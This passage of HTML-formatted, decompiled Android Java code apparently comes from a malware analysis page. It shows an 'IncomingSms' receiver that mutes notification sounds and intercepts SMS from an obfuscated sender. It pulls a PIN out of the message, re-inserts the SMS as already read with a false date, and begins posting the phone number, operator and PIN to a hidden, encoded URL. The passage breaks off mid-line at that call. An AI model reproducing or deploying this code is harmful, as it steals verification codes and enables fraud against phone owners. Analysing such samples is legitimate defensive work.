class="crayon-e">getTimestampMillis</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">v0</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">v8</span><span class="crayon-sy">.</span><span class="crayon-e">equals</span><span class="crayon-sy">(</span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">decode</span><span class="crayon-sy">(</span><span class="crayon-s">"Nzk3OTc3"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">pin</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">getPinFromSms</span><span class="crayon-sy">(</span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-55">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v4</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_78</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-62">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">++</span><span class="crayon-v">v5</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_14</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_16</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">stopSms</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ContentValues </span><span class="crayon-v">v9</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ContentValues</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v9</span><span class="crayon-sy">.</span><span class="crayon-e">put</span><span class="crayon-sy">(</span><span class="crayon-s">"address"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">v8</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v9</span><span class="crayon-sy">.</span><span class="crayon-e">put</span><span class="crayon-sy">(</span><span class="crayon-s">"body"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v9</span><span class="crayon-sy">.</span><span class="crayon-e">put</span><span class="crayon-sy">(</span><span class="crayon-s">"read"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">Integer</span><span class="crayon-sy">.</span><span class="crayon-e">valueOf</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v9</span><span class="crayon-sy">.</span><span class="crayon-e">put</span><span class="crayon-sy">(</span><span class="crayon-s">"date"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">Double</span><span class="crayon-sy">.</span><span class="crayon-e">valueOf</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-t">double</span><span class="crayon-sy">)</span><span class="crayon-v">v2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">1296000000</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">15240000</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">context</span><span class="crayon-sy">.</span><span class="crayon-e">getContentResolver</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">insert</span><span class="crayon-sy">(</span><span class="crayon-v">Uri</span><span class="crayon-sy">.</span><span class="crayon-e">parse</span><span class="crayon-sy">(</span><span class="crayon-s">"content://sms/inbox"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">v9</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v4</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_78</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method changeSms: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v4</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v4</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-80">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-81"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_38</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-82"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method changeSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-84">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-e">getPinFromSms</span><span class="crayon-sy">(</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">message</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">throws</span><span class="crayon-h"> </span><span class="crayon-e">Exception</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-86"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-87"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method getPinFromSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-88"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-89"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">extractNumber</span><span class="crayon-sy">(</span><span class="crayon-v">message</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-90"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-91"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-92"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method getPinFromSms: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-93"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v0</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-94"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-95">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-96"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method getPinFromSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-97"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-98"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-99">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-100"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">muteNotification</span><span class="crayon-sy">(</span><span class="crayon-e">Context </span><span class="crayon-v">context</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">throws</span><span class="crayon-h"> </span><span class="crayon-e">Exception</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-101"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method muteNotification"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-102"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-103"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">context</span><span class="crayon-sy">.</span><span class="crayon-e">getSystemService</span><span class="crayon-sy">(</span><span class="crayon-s">"audio"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">setStreamMute</span><span class="crayon-sy">(</span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-104"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-105"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">catch</span><span class="crayon-sy">(</span><span class="crayon-e">Exception </span><span class="crayon-v">v1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-106"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"error method muteNotification: "</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">.</span><span class="crayon-e">getMessage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-107"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v1</span><span class="crayon-sy">.</span><span class="crayon-e">printStackTrace</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-108"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-109">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-110"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"end method muteNotification"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-111"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-112">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-113"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">onReceive</span><span class="crayon-sy">(</span><span class="crayon-e">Context </span><span class="crayon-v">context</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">Intent </span><span class="crayon-v">intent</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-114"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method onReceive"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-115"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-116"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">muteNotification</span><span class="crayon-sy">(</span><span class="crayon-v">context</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-117"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">changeSms</span><span class="crayon-sy">(</span><span class="crayon-v">context</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">intent</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-118"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Context </span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">context</span><span class="crayon-sy">.</span><span class="crayon-e">getApplicationContext</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-119"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">phoneNumber</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Request</span><span class="crayon-sy">)</span><span class="crayon-v">v1</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getPhoneNumber</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-120"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">paso</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"3"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-121"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">operator</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Request</span><span class="crayon-sy">)</span><span class="crayon-v">v1</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getOperator</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-122"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Request</span><span class="crayon-sy">)</span><span class="crayon-v">v1</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">setPin</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">pin</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-123"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">SendPostReqAsync</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">execute</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">{</span><span class="crayon-v">Util</span><span class="crayon-sy">.</span><span class="crayon-e">decode</span><span class="crayon-sy">(</span><span 